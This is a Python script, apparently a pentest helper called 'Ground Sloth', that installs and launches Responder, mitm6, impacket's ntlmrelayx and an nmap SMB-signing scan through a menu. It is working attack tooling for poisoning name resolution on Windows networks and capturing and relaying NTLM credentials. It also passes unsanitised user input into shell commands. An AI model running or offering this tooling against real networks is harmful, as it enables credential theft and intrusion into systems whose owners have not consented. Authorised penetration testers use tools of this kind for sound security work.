import os
import time
from colorama import Fore, Style


print(Fore.LIGHTCYAN_EX + """\
Welcome to Ground Sloth     
                                 ..
                         ``       ,,╓╓╥╦φ╦╦╦╦╥╥   ` .
                      ,≈nDTT╬╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫N▄,  `  .
                  ╓mÜ,»n╙█H»░╫╫╫╫╫▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫NN╦,
               ,<░»»»»`¡»%µ░░╟╫╫▓╫▓╫▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫Ñ╫╫╫╫╫╫▓╦,  `
           '  ▄,µ»╬H»»»»░░╙K░╫╫╫▓▓▓▓▓╫╫╫╫╫╫╫╫╫▓▓▓╫▓╫╫╫╫╫╫╫╫╫╫╫N▄  `
             ╟▓▓▓╬NhN░░»░░µÑ░╫▓▓▓▓▓▓▓▓╫╫╫╫╫╫╫▓▓▓▓▓▓▓▓╫╫▓╫╫╫╫╫╫╫╫╫N▄   .
           .  ▀▓▓▓▓▓M░░╦M░░╦╫▓▓▓▓▓▓▓▓▓╫╫╫╫╫╫▓▓▓▓▓▓▓▓▓╫╫╫╫▓╫╫╫╫╫╫╫╫╫▓╦  `.
             .  ╙╙╨╩╩╨^`    ▓╫▓▓▓▓▓▓▓▓▓╫╫╫╫╫▓▓▓▓▓▓▓▓▓▓▓╫▓▓▓╫╫▓╫╫╫╫╫╫╫╫N  `
                  ~     `  ╔╫▓▓▓▓╫▓▓▓▓▓╫╫╫╫╫╫▓▓▓▓╫▓▓▓▓▓▓▓▓▓▓▓▓╫▓╫▓╫╫╫╫▓▓▄  .
                          ╓▀▓▓▓▓▓▓▓  "╙▀╫╫╫╫╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╫╫▓▓▓╫╫▓▓▓
                     `  ╓Φ╫▓▓▓▓▓▓╫▀ .   ╙▓╫╫╫╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓H !
                  `  ╓Φ╫▓▓▓▓▓▓▓▓▀└ .   .  ╣╫╫╫╫▓▓▓╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌
                  ,Φ╫▓▓▓▓▓╫▓▀"          \  ▀▓╫╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌
              ,  Φ╫╫▓▓▓▓▀╙  .  `           ▐╫╫╫╫▓▓▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╫▓▓▓▓▓▌
                ╔╫▓▓▀"  .                  ╣╫╫▓▓▓▓╫▓▓▓▓   `╙╙╙▀▀▓▓╫▓▓▓▓▓▓▓▌ :
               ╔╫╫╫▀  '                    ▓╫╫▓╫▓▓▓▓▓▓▓         ▓▓▓▓▓▓▓▓▓▓M !
            '  ▀╟╫╛ ,`                  :  ▌╫╫╫▓▓▓▌▓▓▓▓W        ║▓▓▓▓▓▓▓▓▌  `
            ` ╘½\M                      '  ╫╫╫▓▓▓╫╫╫▓▓▓▓▓⌐      ▄╫▓▓▓▓▓▓▀  '
            `  *╩M  `                   '  ╫╫╫▓▓▓▀▀▀▀▀▀▀▀    ▄╬▓▓▓▓▓▓▓▀- ,`
               .                          ,╫╫╫▓▓▓  ~      1░─╙▓╫▓▓▓▓▓
                                        ╘ß▓╫╫▓▓▓▌ :     `.  `^╙╙╙╙"   '
                                         ╙╨╣▓▓▀╙  '                 `
                                         ~                      
""")


def prerequisites():
    os.system("git clone https://github.com/dirkjanm/mitm6")
    os.system("sudo python3 ./mitm6/setup.py install")
    os.system("git clone https://github.com/SecureAuthCorp/impacket")
    os.system("sudo python3 ./impacket/setup.py install")
    os.system("sudo apt install responder")
    os.system("sudo apt install nmap")
    os.system("sudo apt install tmux")

def get_menu_choice():
    def print_menu():       # Your menu design here
        print(Style.RESET_ALL + 80 * "-")
        print(Fore.LIGHTGREEN_EX + "1. Launch Responder ")
        print("2. Launch Mitm6 ")
        print("3. Launch NTLMRelay ")
        print("4. Launch Nmap Scan ")        
        print("5. Install Required tools ")
        print("6. Exit")
        print(80 * "-" + Style.RESET_ALL)

    loop = True

    while loop:          # While loop which will keep going until loop = False
        print_menu()    # Displays menu
        choice = input("Enter your choice [1-6]: ")
        
        if choice=='1':
            res_config = input("Do you want to use current Responder config? [y/n]: ")
            if res_config == 'y':
                Interface_res=input("Enter Responder listener interface: ") 
                os.system("tmux new -d -s responder")
                os.system("tmux send-keys -t responder 'responder -I "  + Interface_res + " -w -f' ENTER")
                print("Responder launched in new tmux session")
            elif res_config == 'n':
                os.system("nano /usr/share/responder/Responder.conf")
                Interface_res=input("Enter Responder listener interface: ") 
                os.system("tmux new -d -s responder")
                os.system("tmux send-keys -t responder 'responder -I "  + Interface_res + " -w -f' ENTER")
                print("Responder launched in new tmux session")
            else:
                print("Invalid input")

        elif choice=='2':
            domain=input("Enter a Domain: ")
            print("Launching Mitm6 in the background..")
            os.system("tmux new -d -s mitm6")
            os.system("tmux send-keys -t mitm6 'mitm6/mitm6/mitm6.py -d " + domain + "' ENTER")
            print("Mitm6 launched in new tmux session")

        elif choice=='3':
            print("Launching NTLMRelayx")
            Interface_ntlm = input("Enter NTLMRelay domain: ")
            time.sleep(1)
            print(Fore.RED + "\nType Ctl+C to exit NTLMRelayx and return to menu\n" + Style.RESET_ALL)
            time.sleep(4)
            os.system("sudo python3 impacket/examples/ntlmrelayx.py -t " + Interface_ntlm + " -smb2support -socks")
            


        elif choice=='4':
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            hour = time.strftime("%H%S")
            print("Number 4")
            IPAddress=input('Enter the IP Address: ')
            print(IPAddress)
            os.system("sudo nmap -p139,145 --script smb2-security-mode.nse " + IPAddress + " -oA NmapScan")
            os.system("mv NmapScan.xml NmapScan_" + IPAddress + "_" + timestamp + ".xml")
            os.system("mv NmapScan.gnmap NmapScan_" + IPAddress + "_" + timestamp + ".gnmap")
            os.system("mv NmapScan.nmap NmapScan_" + IPAddress + "_" + timestamp + ".nmap")
            time.sleep(2)
            print("Nmap Scan Complete \n")

        elif choice=='5':
            print("Installing..")
            prerequisites()
            print("\nDone")

        elif choice=='6':
            print("Exiting..")
            os.system("tmux kill-session -t responder")
            os.system("tmux kill-session -t mitm6")
            loop = False

        else:
            # Any integer inputs other than values 1-5 we print an error message
            input("Wrong option selection. Enter any key to try again..")

if __name__ == "__main__":
    print(get_menu_choice())



